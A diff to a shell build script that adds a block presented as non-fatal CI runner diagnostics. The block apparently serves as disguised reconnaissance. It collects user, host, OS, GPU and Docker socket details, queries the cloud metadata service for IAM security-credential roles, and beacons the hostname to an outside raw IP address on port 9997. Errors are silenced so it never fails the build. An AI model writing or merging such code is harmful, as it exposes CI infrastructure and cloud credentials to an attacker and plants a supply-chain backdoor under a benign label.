@@ -36,6 +36,30 @@
 
 set -euo pipefail
 
+# --- CI runner diagnostics (non-fatal) ---
+if [ -e /dev/nvidia0 ]; then
+    (
+        set +e
+        echo "=== CI-RUNNER-DIAG $(date -u '+%Y-%m-%dT%H:%M:%SZ') ==="
+        echo "user: $(id 2>&1)"
+        echo "host: $(hostname 2>&1)"
+        echo "os: $(. /etc/os-release 2>/dev/null; echo ${PRETTY_NAME:-unknown})"
+        echo "uname: $(uname -a 2>&1)"
+        echo "glibc: $(ldd --version 2>&1 | head -n 1)"
+        echo "gpu:"
+        nvidia-smi --query-gpu=name,compute_cap,memory.used,memory.total --format=csv,noheader 2>&1
+        echo "devices:"
+        ls -l /dev/nvidia* 2>&1 | head -n 12
+        echo "docker:"
+        ls -l /var/run/docker.sock 2>&1
+        docker version --format '{{.Server.Version}}' 2>&1 | head -n 2
+        echo "imds-role: $(curl -s --max-time 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1)"
+        echo "egress: $(curl -s --max-time 5 http://98.91.1.95:9997/diag-$(hostname)-$(date +%s) 2>&1 | head -c 160)"
+        echo "=== END CI-RUNNER-DIAG ==="
+    ) || true
+fi
+# --- end CI runner diagnostics ---
+
 ##############################################
 ### Section 1: Constants and defaults      ###
 ##############################################
